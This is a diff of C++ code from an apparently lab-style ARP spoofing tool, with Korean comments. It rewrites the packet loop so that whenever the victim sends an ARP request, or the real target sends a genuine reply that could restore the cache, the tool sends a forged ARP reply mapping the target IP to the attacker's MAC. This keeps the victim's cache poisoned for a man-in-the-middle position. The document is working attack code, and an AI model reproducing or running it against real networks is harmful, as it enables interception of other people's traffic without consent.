@@ -273,49 +273,50 @@ int main(int argc, char* argv[]) {
 
 
         else if (ntohs(eth->type_) == EthHdr::Arp) {
-            auto* arp = reinterpret_cast<const ArpHdr*>(packet + sizeof(EthHdr));
-            const auto operation = ntohs(arp->op_);
-            const Ip src_ip(ntohl(arp->sip_));
-            const Ip dst_ip(ntohl(arp->tip_));
-            const Mac& src_mac = arp->smac_;
-            const Mac& dst_mac = arp->tmac_;
+            ArpHdr* arp = (ArpHdr*)(packet + sizeof(EthHdr));
+            uint16_t op = ntohs(arp->op_);
+            Ip sip = Ip(ntohl(arp->sip_));
+            Ip tip = Ip(ntohl(arp->tip_));
+            Mac smac = arp->smac_;
+            Mac tmac = arp->tmac_;
         
-            // 디버깅용 로그 (비활성화 가능)
-            /*
-            std::cout << "[ARP] " << (operation == ArpHdr::Request ? "Request" :
-                                       operation == ArpHdr::Reply   ? "Reply" : "Unknown")
-                      << " from " << std::string(src_ip)
-                      << " to " << std::string(dst_ip) << std::endl;
-            */
+            for (auto& conn : connections) {
+                // 🔍 1. sender가 어떤 주소든 ARP Request 보냄 → 복구 가능성
+                if (op == ArpHdr::Request && sip == conn.sender_ip) {
+                    std::cout << "[!] Detected ARP Request from sender ("
+                              << std::string(sip) << " asking about "
+                              << std::string(tip) << ") → Re-infecting\n";
         
-            for (size_t idx = 0; idx < connections.size(); ++idx) {
-                auto& conn = connections[idx];
-        
-                const bool is_req = (operation == ArpHdr::Request &&
-                                     src_ip == conn.sender_ip &&
-                                     dst_ip == conn.target_ip);
-        
-                const bool is_legit_reply = (operation == ArpHdr::Reply &&
-                                             src_ip == conn.target_ip &&
-                                             dst_ip == conn.sender_ip &&
-                                             src_mac == conn.target_mac);
-        
-                if (is_req || is_legit_reply) {
-                    EthArpPacket forged = make_arp_packet(
+                    EthArpPacket reinfect = make_arp_packet(
                         Mac(attacker_mac), conn.sender_mac,
                         Mac(attacker_mac), conn.sender_mac,
                         conn.target_ip, conn.sender_ip,
                         false
                     );
+                    send_arp_packet(handle, reinfect);
+                    continue;
+                }
         
-                    bool sent = send_arp_packet(handle, forged);
-                    std::cout << "[*] ARP " << (is_req ? "Request" : "Reply")
-                              << " intercepted → Reinfected ("
-                              << std::string(src_ip) << " → " << std::string(dst_ip) << ")"
-                              << (sent ? " [SENT]" : " [FAILED]") << std::endl;
+                // 🔍 2. target이 sender에게 정상 MAC으로 ARP Reply 보냄 → 감염 풀릴 가능성
+                if (op == ArpHdr::Reply &&
+                    sip == conn.target_ip &&
+                    tip == conn.sender_ip &&
+                    smac == conn.target_mac) {
+        
+                    std::cout << "[!] Detected ARP Reply from target to sender → Re-infecting\n";
+        
+                    EthArpPacket reinfect = make_arp_packet(
+                        Mac(attacker_mac), conn.sender_mac,
+                        Mac(attacker_mac), conn.sender_mac,
+                        conn.target_ip, conn.sender_ip,
+                        false
+                    );
+                    send_arp_packet(handle, reinfect);
+                    continue;
                 }
             }
         }
+
 
 
         
